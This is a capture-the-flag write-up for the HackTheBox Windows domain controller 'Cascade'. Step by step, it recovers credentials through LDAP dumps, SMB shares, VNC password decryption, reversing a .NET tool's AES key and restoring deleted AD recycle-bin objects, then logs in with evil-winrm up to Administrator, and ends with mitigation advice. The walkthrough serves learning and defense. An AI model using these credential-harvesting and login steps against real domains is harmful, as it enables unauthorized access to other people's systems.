# Cascade

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- enum4linux

- ldapsearch dump

- SMB shares

__Exploitation__

- Weak password policy

- Reverse engineering files

__Priv Esc__

- Stored passwords

- Recovering Active Directory recycling bin objects

***

This is my guide to the HackTheBox Windows machine _Cascade_.

## User Flag

We'll begin with an `nmap` scan of the box _Cascade_. From the results, it looks like this is a domain controller.

```bash
# Nmap 7.80 scan initiated Sat Jul  4 17:54:10 2020 as: nmap -sC -sV -O -oA scan182 10.10.10.182
Nmap scan report for 10.10.10.182
Host is up (0.085s latency).
Not shown: 986 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-04 22:58:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m23s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-07-04T22:59:51
|_  start_date: 2020-07-03T04:16:09

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  4 17:58:04 2020 -- 1 IP address (1 host up) scanned in 234.38 seconds
```

Let's also run a full port scan as well.  

```bash
$ sudo nmap -sC -sV -O -p- -oA full182 10.10.10.182
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The only useful information that this yields is that port 5985 is open, indicating to us that `WinRM 2.0 (Microsoft Windows Remote Management)` is available. Once we have some credentials, this is an option for a foothold.

We'll go ahead and run `enum4linux` as well.

```
$ enum4linux 10.10.10.182
```

This reveals a list of users to us. Let's make note of these users for later.

![](images/users.png)

Further enumeration methods don't seem to yield any more useful results. We still don't have sufficient information to start reading file shares or gain a foothold. We'll go ahead and run `ldapsearch` and dump as much domain controller data that we can.

```
$ ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182 > ldap.txt
```

This command will dump a ton of information into a text file for us to sift through. A few thousand lines in we find a field named `cascadeLegacyPwd` with what appears to be a `base64` encoded password for the user `r.thompson`.

```
[...]
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132382409952694090
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
[...]
```

Decoding this reveals the password `rY4n5eva`. Let's see what we can do with this information.

First thing we'll try is `smb` enumeration with `smbclient`.

```
$ smbclient -L 10.10.10.182 -U r.thompson%rY4n5eva
```

Good news, we are able to successfully view the shares on the machine. Let's start enumerating them.

![](images/smbclient-ryan.png)

The two share that really stand out are the `Data` and `Audit$` shares. Unfortunately, user `r.thompson` doesn't have `Audit$` access, but do have permissions for the `Data` share.

```
$ smbclient \\\\10.10.10.182\\Data -U r.thompson%rY4n5eva
```

Within the `IT` directory of the `Data` share, we found a couple of interesting files the first, `Meeting_Notes_June_2018` is from the `Email Archives` subdirectory.

```html
<p>For anyone that missed yesterday’s meeting (I’m looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the “Best GPO” competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p class=MsoNormal>Steve</p>
```

We'll make note of this, it doesn't appear to have any pertinent information for us right now, but it suggests that a `TempAdmin` user account was deleted which used the same password as the active Administrator account.

Another interesting file is `Ark AD Recycle Bin` within the `Logs` subdirectory, which indicates to us that this domain controller uses an AD recycle bin, which may be where we can discover more information about the "deleted" `TempAdmin`. Let's make note of that and move on.

The last file we find is in the subdirectory of `s.smith` within the `Temp` directory. Strangely we have read access and are able to view the `VNC Install.reg` file.

```
> cd IT
> cd Temp
> cd s.smith
> get "VNC Install.reg"
```

This file contains a password, which VNC encodes.

```
[...]
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
[...]
```


With a little research, we find [this tool](https://github.com/trinitronx/vncpasswd.py) which decrypts the hex password. Let's go ahead and download it and run it on the hex string.

```
$ python vncpasswd.py -d 6bcf2a4b6e5aca0f -H
Decrypted Bin Pass= 'sT333ve2'
Decrypted Hex Pass= '7354333333766532'
```

Considering the VNC file was in the directory of user `s.smith`, we can probably assume that the password `sT333ve2` belongs to this user. Let's add it to our password text file, then attempt to connect to `WinRM`. We'll use the tool `evil-winrm`, [a shell](https://github.com/Hackplayers/evil-winrm) specialized for hacking and penetration testing.

```
$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
```

Success! Let's grab the flag off of the user's desktop.

![](images/user-flag.png)

## Root Flag

Enumerating further doesn't seem to reveal much but `s.smith` does have permission to view the `Audit$` share. Let's use `smbclient` to enumerate this further.

```
smbclient \\\\10.10.10.182\\Audit$ -U s.smith%sT333ve2
```

Okay, so this share contains some very interesting files. It looks like an auditing program that potentially references a `DLL` and a database containing account information.

Let's go ahead grab all the files and bring them over to our machine to perform some reverse engineering.

```
> get CascAudit.exe
> get CascCrypto.dll
> cd DB
> get Audit.db
```

The first thing we'll do is check the database for anything useful. After poking around a bit, we can see that the password for the user `ArkSvc` is available, but encrypted.

![](images/db.png)

Traditional decoding doesn't seem to work on this string, so let's check our other two files to see if we can find something that can help us.

We have to do some basic reverse engineering, so let's use [ILSpy](https://github.com/icsharpcode/AvaloniaILSpy), a cross-platform decompiler for .NET applications. This will allow us to view the source code of each file.

Within the `CascAudit.exe` file, we find that the encyption is the Advanced Encyption Standard, or AES, and the encryption mode is Cipher Block Chaining, or CBC. This indicates that we will need a secret key and Initialization Vector, or IV, to decrypt the password. Computerphile has [a great video](https://www.youtube.com/watch?v=O4xNJsjtN6E) on how AES works.

Upon further investigation, we find a method containing the secret key that is used to encrypt or decrypt the password stored in the database.

![](images/cascaudit-pass.png)

Let's make note of the secret key.

```
Secret Key: c4scadek3y654321
```

Next, we'll decompile the `CascCrypto.dll` file. Pretty quickly, we find the value for the IV. We can also see the key size is 128.

![](images/casccrypto-iv.png)

We can use this information to decrypt the password offline, or we can use one of the many online options. Let's go ahead and plug the pieces into [this website for online AES decryption](https://www.devglan.com/online-tools/aes-encryption-decryption).

I'd also like to note that the code can be modified and executed on a Windows machine to reveal the decrypted password as well. It's good practice to have sandboxes for multiple operating systems available for situations like these.

![](images/aes-decrypt.png)

The password for the user `ArkSvc` is decrypted and we receive `w3lc0meFr31nd`. Let's attempt remote login with `evil-winrm`.

```
$ evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
```

Success. With our new foothold, we can try to escalate our privilege.

Earlier, we discovered that the box is using Active Directory recycle bin, and we can recall the logs indicate that the user `ArkSvc` can perform these recycling functions.

Additonally, we learned that `TempAdmin` was "recycled" and had the same password as the Administrator. [Poweradmin](https://www.poweradmin.com/blog/restoring-deleted-objects-from-active-directory-using-ad-recycle-bin/) has a great article on how to restore or view objects that had been deleted using the AD recycle bin.

In our `WinRM` shell, let's run the following command, which should display the objects that have been deleted.


```
> Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
[...]
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
[...]
```

A little ways down, we can see the object `TempAdmin` and a field `cascadeLegacyPwd`. We know from earlier that the password is `base64` encoded, let's grab it and decode it.

```
$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

Now let's see if the Administrator password hasn't been changed. We'll attempt connection with our newly acquired password.

```
$ evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles
```

Success! Let's grab the root flag off the Administrator desktop.

![](images/root-flag.png)

***

### Mitigation

- Strong password policies are important and must be enforced. A user should be required to change a legacy password, and if the user account is no longer in use for that not to occur, than account management should result in disabling the account and/or remove privileges.

- Avoid using the same password across multiple accounts, especially the one used by the Administrator. It may be convenient, but it exposes the account to risk. In this specific scenario with `TempAdmin`, simply changing the password after the migration or using a password with just one different character may have prevented an attack.

- An administrator using the AD recycle bin should better monitor the recovery period for a deleted object. This is specified with the `msDS-DeletedObjectLifetime` attribute. According to the email `Meeting_Notes_June_2018`, the `TempAdmin` account was moved to the recycle bin at the end of 2018, meaning it was there for over a year. Understanding that an object and it's attributes moved to the recycle bin are not actually deleted until after it's lifetime is up is key.

### Final Thoughts

This was probably one of my favorite boxes so far. It had an excellent and realistic combination of enumeration, note-taking, and reverse engineering that was challenging but not frustrating. I learned a lot and will definitely look back on _Cascade_ going forward.
